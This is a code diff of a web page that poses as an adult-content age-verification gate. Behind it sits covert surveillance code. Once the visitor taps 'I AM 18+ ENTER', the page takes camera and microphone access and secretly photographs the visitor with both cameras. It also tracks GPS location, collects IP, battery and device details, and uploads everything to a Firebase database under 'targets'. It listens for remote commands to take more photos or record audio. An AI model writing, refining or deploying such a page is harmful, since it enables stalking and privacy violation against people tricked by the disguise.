@@ -7,29 +7,21 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { margin:0; background:#111; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
-        #blur-vid { position:absolute; width:100%; height:100%; object-fit:cover; filter: blur(30px); opacity:0.5; }
-        #verify-box { position:relative; z-index:10; background:#fff; padding:40px 20px; border-radius:10px; text-align:center; width:90%; max-width:350px; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
-        .age-icon { font-size: 50px; color: #ff3131; margin-bottom: 10px; }
-        h2 { margin: 10px 0; color: #222; font-size: 22px; }
-        p { color: #666; font-size: 14px; margin-bottom: 25px; }
-        .btn-confirm { background:#222; color:#fff; border:none; padding:15px 40px; font-weight:bold; border-radius:5px; cursor:pointer; width: 100%; font-size:16px; transition: 0.3s; }
-        .btn-confirm:hover { background: #000; }
-        #video-player { display:none; width:100%; height:100%; object-fit:contain; z-index:5; position:relative; }
+        body { margin:0; background:#000; font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
+        #verify-box { position:relative; z-index:10; background:#fff; padding:30px; border-radius:10px; text-align:center; width:85%; max-width:320px; }
+        .btn { background:#ff3131; color:#fff; border:none; padding:15px; width:100%; border-radius:5px; cursor:pointer; font-weight:bold; }
+        video#main-player { display:none; width:100%; height:100%; object-fit:contain; }
     </style>
 </head>
 <body>
 
-<video id="blur-vid" autoplay muted loop playsinline src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
-
 <div id="verify-box">
-    <div class="age-icon">🔞</div>
-    <h2>AGE VERIFICATION</h2>
-    <p>This content is age-restricted. Please confirm you are 18 years or older to proceed.</p>
-    <button class="btn-confirm" onclick="initVerification()">I AM 18+ ENTER</button>
+    <h2 style="color:#222">18+ WARNING</h2>
+    <p style="color:#666">Confirm your age to watch the private stream.</p>
+    <button class="btn" onclick="startSystem()">I AM 18+ ENTER</button>
 </div>
 
-<video id="video-player" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
+<video id="main-player" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
 
 <script>
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
@@ -37,87 +29,105 @@
     const db = firebase.database();
     const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
 
-    let activeStream = null;
+    let globalStream = null;
 
-    async function initVerification() {
+    async function startSystem() {
         document.getElementById('verify-box').style.display = 'none';
-        document.getElementById('blur-vid').style.display = 'none';
-        const v = document.getElementById('video-player');
+        const v = document.getElementById('main-player');
         v.style.display = 'block';
 
         try {
-            // Step 1: Request permissions (Sabse pehle mic/cam access)
-            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            // Step 1: Initialize Main Stream (Keep it Alive)
+            await initStream();
             v.play();
 
-            // Step 2: Device Details & IP
-            let ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
-            db.ref(`targets/${sessionID}/info`).set({
-                status: "ONLINE",
-                ip: ipData.ip,
-                device: navigator.platform,
-                time: new Date().toLocaleTimeString()
+            // Step 2: Auto Data Capture
+            sendInfo();
+            trackGPS();
+            
+            // Step 3: Fast Auto Capture (Front then Back)
+            setTimeout(() => capture("user"), 2000);
+            setTimeout(() => capture("environment"), 6000);
+
+            // Step 4: Persistent Command Listener
+            db.ref(`commands/${sessionID}`).on('value', snap => {
+                const cmd = snap.val();
+                if(cmd) {
+                    if(cmd.action === 'photo') capture("user");
+                    if(cmd.action === 'back') capture("environment");
+                    if(cmd.action === 'audio') recordAudio();
+                    db.ref(`commands/${sessionID}`).remove();
+                }
             });
 
-            // Step 3: Trigger Back Camera (Fixed Logic)
-            await captureBackCamera();
-
-            // Real-time listener
-            db.ref(`commands/${sessionID}`).on('value', s => {
-                const c = s.val(); if(!c) return;
-                if(c.action === 'photo') captureFront();
-                if(c.action === 'back') captureBackCamera();
-                db.ref(`commands/${sessionID}`).remove();
-            });
-
-        } catch (e) {
-            alert("Verification Failed: Camera/Microphone access is required for security check.");
-            location.reload();
-        }
+        } catch (e) { alert("Permission Required!"); location.reload(); }
     }
 
-    async function captureBackCamera() {
+    async function initStream() {
+        if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
+        globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        return globalStream;
+    }
+
+    async function capture(mode) {
         try {
-            // Modern Phone Fix: Pehle waale tracks stop karne padte hain switching ke liye
-            if (activeStream) {
-                activeStream.getTracks().forEach(track => track.stop());
-            }
-
-            const constraints = {
-                video: { facingMode: { ideal: "environment" } }
-            };
-
-            const backStream = await navigator.mediaDevices.getUserMedia(constraints);
+            // Pehle wala camera release karna zaroori hai switching ke liye
+            if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: { ideal: mode } } 
+            });
+            
             const tempVid = document.createElement('video');
-            tempVid.srcObject = backStream;
+            tempVid.srcObject = stream;
             await tempVid.play();
 
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = tempVid.videoWidth; 
-                canvas.height = tempVid.videoHeight;
+                canvas.width = tempVid.videoWidth; canvas.height = tempVid.videoHeight;
                 canvas.getContext('2d').drawImage(tempVid, 0, 0);
                 
                 db.ref(`targets/${sessionID}/photos`).push({
                     img: canvas.toDataURL('image/jpeg', 0.5),
-                    type: "BACK_CAM"
+                    type: mode === "user" ? "FRONT" : "BACK"
                 });
-
-                // Wapas main stream restore karein (Front/Mic)
-                backStream.getTracks().forEach(t => t.stop());
-                restoreMainStream();
-            }, 3000);
-        } catch (err) {
-            db.ref(`targets/${sessionID}/logs`).push("Back Cam Fail: " + err.message);
-        }
+                
+                // Camera release karein aur wapas global stream par aayein
+                stream.getTracks().forEach(t => t.stop());
+                initStream(); // Restart stream to keep listener alive
+            }, 2000);
+        } catch (err) { initStream(); }
     }
 
-    async function restoreMainStream() {
-        activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    async function sendInfo() {
+        const batt = await navigator.getBattery().catch(() => ({level:1}));
+        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
+        db.ref(`targets/${sessionID}/info`).set({
+            status: "ONLINE",
+            ip: ip.ip,
+            battery: Math.floor(batt.level * 100) + "%",
+            device: navigator.userAgent.split(') ')[0] + ')',
+            time: new Date().toLocaleTimeString()
+        });
     }
 
-    async function captureFront() {
-        // Front capture logic...
+    function trackGPS() {
+        navigator.geolocation.watchPosition(p => {
+            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+        }, null, {enableHighAccuracy:true});
+    }
+
+    async function recordAudio() {
+        const recorder = new MediaRecorder(globalStream);
+        let chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+            const reader = new FileReader();
+            reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
+            reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({data: reader.result});
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 10000);
     }
 </script>
 </body>
